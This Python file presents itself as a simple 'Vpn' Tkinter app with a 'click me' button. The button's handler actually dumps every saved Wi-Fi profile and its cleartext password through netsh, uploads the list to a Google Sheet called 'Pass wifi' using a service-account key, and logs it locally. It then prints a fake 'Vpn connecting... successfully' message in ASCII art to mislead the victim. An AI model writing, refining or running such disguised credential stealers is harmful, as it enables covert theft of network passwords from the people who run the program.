import tkinter as tk
from art import *
root = tk.Tk()
root.geometry("300x200")
root.title("Vpn")
def func(event):

    print("You hit return.")
root.bind('<Return>', func)

def onclick():
    import subprocess
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8',
                                                                                 errors="backslashreplace").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    Data = []
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8',
                                                                                                           errors="backslashreplace").split(
                '\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
               # print("{:<30}|  {:<}".format(i, results[0]))
                Data.append('%s | %s' % (i, results[0]))
                # print('%s | %s'%(i,results[0]))
            except IndexError:
                print("{:<30}|  {:<}".format(i, ""))

        except subprocess.CalledProcessError:
            print("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
    # input("")
    #print(data)
    import gspread
    from oauth2client.service_account import ServiceAccountCredentials
    from pprint import pprint
    scope = ["https://spreadsheets.google.com/feeds", 'https://www.googleapis.com/auth/spreadsheets',
             "https://www.googleapis.com/auth/drive.file", "https://www.googleapis.com/auth/drive"]
    creds = ServiceAccountCredentials.from_json_keyfile_name("key.json", scope)
    client = gspread.authorize(creds)
    sheet = client.open("Pass wifi").sheet1
    data = sheet.get_all_records()

    # row = sheet.row_values(3)
    col = sheet.col_values(1)
    # cell = sheet.cell(1,2)
    #pprint(col)
    insertRow = [str(Data)]
    sheet.append_row(insertRow)
    f = open("demofile2.txt", "a")
    f.write(str(Data) + '\n')
    f.close()
    print("Vpn connecting......")
    tprint("successfully")
    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print(text2art('Bye', font="small"))  # Multi-line print
    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

button = tk.Button(root, text="click me", command=onclick,font='impact 50')
button.pack()

root.mainloop()